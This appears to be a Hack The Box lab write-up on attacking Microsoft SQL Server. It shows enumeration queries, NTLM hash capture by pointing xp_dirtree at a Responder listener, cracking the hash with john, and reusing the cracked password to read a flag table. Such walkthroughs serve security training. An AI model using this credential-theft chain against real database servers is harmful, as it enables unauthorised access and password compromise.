---
tags:
  - htb
  - linux
  - sql
draft: false
date: 2026-06-10
title: Attacking SQL Databases
---
### Q1: What is the password for the "mssqlsvc" user?

let's begin with authentication with given credentials:

```
mysql -u htbdbuser -p MSSQLAccess01! -h $ipAddress$
```

It didn't work, time to use different option:

```
mssqlclient.py htbdbuser@$ipAddress$
```

Next, we can check our priveleges:
```
SQL (htbdbuser  guest@master)> SELECT SYSTEM_USER;
            
---------   
htbdbuser   
SQL (htbdbuser  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0   
```
and then we can look for interesting database:
```
SQL (htbdbuser  guest@master)> SELECT name FROM master.dbo.sysdatabases
name      
-------   
master    
tempdb    
model     
msdb      
hmaildb
flagDB
```

after checking options I finally found this:
```
SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
name   
----   
SQL (htbdbuser  guest@master)> SELECT srvname, srvproduct, rpcout FROM master..sysservers;
srvname               srvproduct   rpcout   
-------------------   ----------   ------   
WINSRV02\SQLEXPRESS   SQL Server     True   
```

we can't impersonate, but DB has a linked server, but unfortunately it didn't work too.

next thing I can try is hash stealing  with `Responer`:
```
sudo responder -I tun0
```
and in logged as `htbuser` window:
```
EXEC master..xp_dirtree '\\$ipAddress$\share\';
```

after few seconds I obtained `NTLMv2-SSP Hash` so i saved it in file and cracked using `john`:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

hash has been cracked in a second, after many tries I got password and answer needed for this question.

### Q2: Enumerate the "flagDB" database and submit a flag as your answer.

first thing we need to do is to authenticate with obtained password:

```
mssqlclient.py mssqlsvc@$ipAddress$ -windows-auth
```

after successful authentication we can find our flag and check it's contents:
```
use flagDB;
SELECT name FROM sys.tables;
SELECT * FROM $tableName$;
```

This way I obtained the flag and finished the lab.